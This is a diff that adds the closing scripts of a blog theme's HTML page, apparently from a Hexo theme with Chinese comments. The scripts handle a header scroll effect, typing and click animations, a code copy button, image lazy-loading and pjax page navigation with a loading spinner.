+<script>
+  let setHeaderClass = () => {
+    const headerMenuTransparent = true;
+    if (!headerMenuTransparent) { return; }
+    const nav = $('#navHeader');
+    const navTop = nav.outerHeight();
+    const winTop = $(window).scrollTop();
+    if(winTop > navTop) {
+      nav.addClass('header-bg-color');
+    }
+    else {
+      nav.removeClass('header-bg-color');
+    }
+  };
+
+  let scrollCollect = () => {
+    return bamboo.throttle(function (e) {
+      setHeaderClass();
+    }, 200)()
+  }
+
+  let initHeaderBg = () => {
+    setHeaderClass();
+  }
+
+  setHeaderClass();
+  window.addEventListener('scroll', scrollCollect);
+
+  document.addEventListener('pjax:send', function () {
+    window.removeEventListener('scroll', scrollCollect)
+  })
+  document.addEventListener('pjax:complete', function () {
+    window.addEventListener('scroll', scrollCollect);
+    setHeaderClass();
+  })
+</script> 
+
+<!-- 渲染issues标签里的内容 -->
+<script>
+  function loadIssuesJS() {
+    if ($(".post-detail").find(".issues-api").length == 0) {
+      return;
+    } 
+    loadScript('/js/issues/index.js');
+  };
+  $(function () {
+    loadIssuesJS();
+  });
+  document.addEventListener('pjax:complete', function () {
+    if (typeof IssuesAPI == "undefined") {
+      loadIssuesJS();
+    }
+  })
+</script>
+
+<!-- 输入框打字特效 -->
+<!-- 输入框打字特效 -->
+
+  <script src="/js/activate-power-mode.js"></script>
+  <script>
+    POWERMODE.colorful = true;  // 打开随机颜色特效
+    POWERMODE.shake = false;    // 关闭输入框抖动
+    document.body.addEventListener('input', POWERMODE);//监听打字事件
+  </script>
+
+
+<!-- markdown代码一键复制功能 -->
+
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/v-plugs-ayu/lib/ayu.css">
+  <script src="https://cdn.jsdelivr.net/npm/v-plugs-ayu/lib/ayu.umd.min.js"></script>
+  <script src="/js/clipboard/clipboard.min.js"></script>
+  <div id="appCopy">
+  </div>
+  <script data-pjax>
+    var vm = new Vue({
+      el: '#appCopy',
+      data: {
+      },
+      computed: {
+      },
+      mounted() {
+        const that = this;
+        var copy = '复制';
+        /* code */
+        var initCopyCode = function () {
+          var copyHtml = '';
+          copyHtml += '<button class="btn-copy" data-clipboard-snippet="" style="position:absolute;top:0;right:0;z-index:1;">';
+          copyHtml += '<i class="fas fa-copy"></i><span>' + copy + '</span>';
+          copyHtml += '</button>';
+          $(".post-detail pre").not('.gutter pre').wrap("<div class='codeBox' style='position:relative;width:100%;'></div>")
+          $(".post-detail pre").not('.gutter pre').before(copyHtml);
+          new ClipboardJS('.btn-copy', {
+            target: function (trigger) {
+              return trigger.nextElementSibling;
+            }
+          });
+        }
+        initCopyCode();
+        $('.btn-copy').unbind('click').bind('click', function () {
+          doSomething();
+        })
+        $(document).unbind('keypress').bind('keypress', function (e) {
+          if (e.ctrlKey && e.keyCode == 67) {
+            doSomething();
+          }
+        })
+
+        function doSomething() {
+          that.$notify({
+            title: "成功",
+            content: "代码已复制，请遵守相关授权协议。",
+            type: 'success'
+          })
+        }
+      },
+      methods: {
+      },
+      created() { }
+    })
+  </script>
+  
+
+<!-- 图片懒加载 -->
+<script defer src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@17.1.0/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazyload",
+    threshold: 0
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    lazyLoadInstance.update();
+  });
+  document.addEventListener('pjax:complete', function () {
+    lazyLoadInstance.update();
+  });
+</script>
+
+
+<!-- 卡片滚动动画 -->
+   
+
+<!-- 评论所需js -->
+
+  
+
+
+<!-- 鼠标点击特效 -->
+<!-- 爱心点击 -->
+
+   
+    <script src="/js/cursor/clicklove.js"></script> 
+  
+
+
+
+
+
+    <!-- pjax -->
+    
+
+<!-- pjax -->
+
+
+  <script src="/js/pjax@0.2.8/index.js"></script>
+  
+    <!-- 样式位于：source/css/_third-party/pjaxanimate.styl -->
+
+<div class="pjax-animate">
+  
+    <div class="loading-circle"><div id="loader-circle"></div></div>
+    <script>
+      window.ShowLoading = function() {
+        $(".loading-circle").css("display", "block");
+      };
+      window.HideLoading = function() {
+        $(".loading-circle").css("display", "none");
+      }
+    </script>
+  
+	<script>
+    document.addEventListener('pjax:complete', function () {
+      window.HideLoading();
+    })
+    document.addEventListener('pjax:send', function () {
+      window.ShowLoading();
+    })
+    document.addEventListener('pjax:error', function () {
+      window.HideLoading();
+    })
+	</script>
+</div>
+
+  
+
+  <script>
+    var pjax = new Pjax({
+      elements: 'a[href]:not([href^="#"]):not([href="javascript:void(0)"]):not([no-pjax])',   // 拦截正常带链接的 a 标签
+      selectors: ["#pjax-container","title"],                                   // 根据实际需要确认重载区域
+      cacheBust: false,   // url 地址追加时间戳，用以避免浏览器缓存
+      timeout: 5000
+    });
+
+    document.addEventListener('pjax:send', function (e) {
+
+      try {
+        var currentUrl = window.location.pathname;
+        var targetUrl = e.triggerElement.href;
+        var banUrl = [""];
+        if (banUrl[0] != "") {
+          banUrl.forEach(item => {
+            if(currentUrl.indexOf(item) != -1 || targetUrl.indexOf(item) != -1) {
+              window.location.href = targetUrl;
+            }
+          });
+        }
+      } catch (error) {}
+
+      $(window).unbind('resize');
+      $(window).unbind('scroll');
+      $(document).unbind('scroll');
+      $(document).unbind('click');
+      $('body').unbind('click');
+
+    })
+    
+    document.addEventListener('pjax:complete', function () {
+      $('script[data-pjax], .pjax-reload script').each(function () {
+        $(this).parent().append($(this).remove());
+      });
+    });
+
+    document.addEventListener('pjax:error', function (e) {
+      window.location.href = e.triggerElement.href;
+    })
+    
+    // 刷新不从顶部开始
+    document.addEventListener("DOMContentLoaded", function () {
+      history.scrollRestoration = 'auto';
+    })
+  </script>
+
+
+
+  </body>
+</html>
